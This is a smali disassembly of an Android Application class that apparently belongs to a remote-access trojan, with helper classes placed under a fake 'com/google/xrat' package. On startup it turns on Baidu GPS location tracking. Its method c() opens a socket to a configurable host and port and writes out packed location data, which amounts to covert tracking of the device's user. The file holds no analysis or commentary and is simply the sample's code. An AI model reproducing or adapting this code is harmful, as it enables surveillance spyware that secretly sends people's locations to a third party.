.class public Lcom/v1/lib/Location;
.super Landroid/app/Application;


# static fields
.field public static c:Ljava/lang/String;


# instance fields
.field public a:Lcom/baidu/location/LocationClient;

.field public b:Lcom/v1/lib/i;

.field private d:Ljava/lang/String;

.field private e:S

.field private f:I

.field private g:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "Location"

    sput-object v0, Lcom/v1/lib/Location;->c:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    new-instance v0, Lcom/v1/lib/i;

    invoke-direct {v0, p0}, Lcom/v1/lib/i;-><init>(Lcom/v1/lib/Location;)V

    iput-object v0, p0, Lcom/v1/lib/Location;->b:Lcom/v1/lib/i;

    return-void
.end method


# virtual methods
.method public final a()Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/v1/lib/Location;->g:Ljava/lang/String;

    return-object v0
.end method

.method public final a(I)V
    .locals 0

    iput p1, p0, Lcom/v1/lib/Location;->f:I

    return-void
.end method

.method public final a(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/v1/lib/Location;->d:Ljava/lang/String;

    return-void
.end method

.method public final a(S)V
    .locals 0

    iput-short p1, p0, Lcom/v1/lib/Location;->e:S

    return-void
.end method

.method public final b(Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/v1/lib/Location;->g:Ljava/lang/String;

    return-void
.end method

.method public final c(Ljava/lang/String;)V
    .locals 5

    if-eqz p1, :cond_0

    :try_start_0
    sget-object v0, Lcom/v1/lib/Location;->c:Ljava/lang/String;

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/net/Socket;

    iget-object v1, p0, Lcom/v1/lib/Location;->d:Ljava/lang/String;

    iget v2, p0, Lcom/v1/lib/Location;->f:I

    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    new-instance v1, Ljava/io/DataOutputStream;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    iget-short v0, p0, Lcom/v1/lib/Location;->e:S

    const/4 v2, 0x0

    invoke-static {p1}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    invoke-static {p1}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    invoke-static {v0, v2, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/DataOutputStream;->write([B)V

    :cond_0
    iget-object v0, p0, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    invoke-virtual {v0}, Lcom/baidu/location/LocationClient;->stop()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onCreate()V
    .locals 3

    const/4 v2, 0x1

    new-instance v0, Lcom/baidu/location/LocationClient;

    invoke-direct {v0, p0}, Lcom/baidu/location/LocationClient;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    iget-object v0, p0, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    iget-object v1, p0, Lcom/v1/lib/Location;->b:Lcom/v1/lib/i;

    invoke-virtual {v0, v1}, Lcom/baidu/location/LocationClient;->registerLocationListener(Lcom/baidu/location/BDLocationListener;)V

    new-instance v0, Lcom/baidu/location/LocationClientOption;

    invoke-direct {v0}, Lcom/baidu/location/LocationClientOption;-><init>()V

    invoke-virtual {v0, v2}, Lcom/baidu/location/LocationClientOption;->setOpenGps(Z)V

    const-string v1, "bd09ll"

    invoke-virtual {v0, v1}, Lcom/baidu/location/LocationClientOption;->setCoorType(Ljava/lang/String;)V

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Lcom/baidu/location/LocationClientOption;->setPriority(I)V

    const/16 v1, 0xa

    invoke-virtual {v0, v1}, Lcom/baidu/location/LocationClientOption;->setPoiNumber(I)V

    invoke-virtual {v0, v2}, Lcom/baidu/location/LocationClientOption;->disableCache(Z)V

    const-string v1, "all"

    invoke-virtual {v0, v1}, Lcom/baidu/location/LocationClientOption;->setAddrType(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/v1/lib/Location;->a:Lcom/baidu/location/LocationClient;

    invoke-virtual {v1, v0}, Lcom/baidu/location/LocationClient;->setLocOption(Lcom/baidu/location/LocationClientOption;)V

    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    sget-object v0, Lcom/v1/lib/Location;->c:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "... Application onCreate... pid="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method
